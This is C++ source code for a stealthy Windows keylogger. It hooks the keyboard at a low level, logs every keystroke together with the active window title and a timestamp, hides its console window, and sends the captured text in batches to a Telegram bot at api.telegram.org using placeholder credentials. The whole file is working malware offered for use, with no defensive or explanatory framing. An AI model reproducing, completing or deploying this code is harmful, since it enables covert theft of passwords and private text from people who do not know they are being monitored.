#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

// Configuration defines
#define hidden
#define bootwait
#define FORMAT 0
#define mouseignore

const std::string telegramToken = "your_telegram_bot_token";
const std::string chatID = "your_chat_id";

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::stringstream logStream;

int Save(int key_stroke);
void Stealth();
bool IsSystemBooting();
void SetHook();
void ReleaseHook();
void SendToTelegram(const std::string &message);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

#ifndef mouseignore
    if (key_stroke == 1 || key_stroke == 2)
    {
        return 0;
    }
#endif

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif

    logStream << output.str();
    std::cout << output.str();
    if (logStream.tellp() > 512) // Send logs to Telegram when buffer exceeds 512 bytes
    {
        SendToTelegram(logStream.str());
        logStream.str("");
        logStream.clear();
    }

    return 0;
}

void Stealth()
{
#ifdef hidden
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

void SendToTelegram(const std::string &message)
{
    HINTERNET hInternet = InternetOpen(L"Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
        return;

    HINTERNET hConnect = InternetConnect(hInternet, L"api.telegram.org", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    std::string request = "/bot" + telegramToken + "/sendMessage?chat_id=" + chatID + "&text=" + message;
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", std::wstring(request.begin(), request.end()).c_str(), NULL, NULL, NULL, 0, 0);
    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    HttpSendRequest(hRequest, NULL, 0, NULL, 0);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main()
{
    Stealth();

#ifdef bootwait
    while (IsSystemBooting())
    {
        std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait
    std::cout << "Skipping boot metrics check.\n";
#endif

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}
